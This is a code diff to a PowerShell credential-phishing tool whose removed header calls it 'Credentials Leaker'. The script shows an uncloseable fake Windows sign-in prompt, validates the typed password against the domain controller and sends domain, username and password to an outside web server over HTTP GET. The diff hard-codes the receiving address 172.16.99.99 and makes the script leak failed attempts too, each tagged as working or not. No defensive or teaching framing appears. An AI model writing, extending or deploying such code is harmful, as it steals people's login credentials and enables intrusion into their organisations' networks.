@@ -1,10 +1,4 @@
 '''
-Credentials Leaker v3 By Dviros
-
-This script will display a Windows Security Credentials box that will ask the user for his credentials.
-
-The box cannot be closed (only by killing the process) and it keeps checking the credentials against the DC. If its valid, it will close and leak it to a web server outside.
-
 '''
 ###########################################################################################################
 
@@ -31,6 +25,7 @@ $options.AuthenticationProtocol = 0
 $options.Caption = "Sign in"
 $options.Message = "Enter your credentials"
 $options.TargetName = "1"
+$working = "Working-No"
 
 
 # CredentialPicker is using Async so we will need to use Await
@@ -41,9 +36,9 @@ function Await($WinRtTask, $ResultType) {
     $netTask.Result
 }
 
-function Leaker($domain,$username,$password){
+function Leaker($domain,$username,$password,$working){
     try{
-        Invoke-WebRequest http://Server_IP:PORT/$domain";"$username";"$password -Method GET -ErrorAction Ignore
+        Invoke-WebRequest http://172.16.99.99:80/$domain";"$username";"$password";"$working -Method GET -ErrorAction Ignore
         }
     catch{}
     }
@@ -71,6 +66,7 @@ function Credentials(){
                     exit
                     }
                 else {
+                    leaker($CurrentDomain_Name,$username,$password,$working)
                     Credentials
                     }                
                 }
@@ -81,7 +77,8 @@ function Credentials(){
                 Credentials
             }
             else {
-                leaker($CurrentDomain_Name,$username,$password)
+                $working = "Working-Yes"
+                leaker($CurrentDomain_Name,$username,$password,$working)
                 $status = $false
                 exit
             }
